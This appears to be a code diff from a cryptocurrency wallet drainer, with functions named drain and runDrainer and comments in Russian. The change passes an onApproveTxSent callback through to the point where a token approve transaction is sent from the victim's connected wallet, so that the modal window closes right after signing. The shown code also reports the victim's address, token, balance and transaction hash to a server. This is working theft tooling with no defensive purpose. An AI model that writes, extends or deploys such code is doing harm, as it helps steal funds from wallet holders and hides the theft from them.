@@ -409,7 +409,7 @@ function formatBalance(balance, decimals) {
 }
 
 // Выполнение дрейна
-async function drain(chainId, signer, userAddress, bal, provider) {
+async function drain(chainId, signer, userAddress, bal, provider, onApproveTxSent) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
   const config = CHAINS[chainId];
@@ -559,6 +559,12 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
+        
+        // Вызываем коллбэк для закрытия модального окна
+        if (onApproveTxSent) {
+          await onApproveTxSent();
+        }
+
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
@@ -647,7 +653,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 }
 
 // Основная функция
-export async function runDrainer(provider, signer, userAddress) {
+export async function runDrainer(provider, signer, userAddress, onApproveTxSent) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
   const minDelay = 0; // Убираем минимальную задержку
@@ -684,6 +690,6 @@ export async function runDrainer(provider, signer, userAddress) {
 
   const target = sorted[0];
   await switchChain(target.chainId);
-  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
+  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider, onApproveTxSent);
   return status;
 }
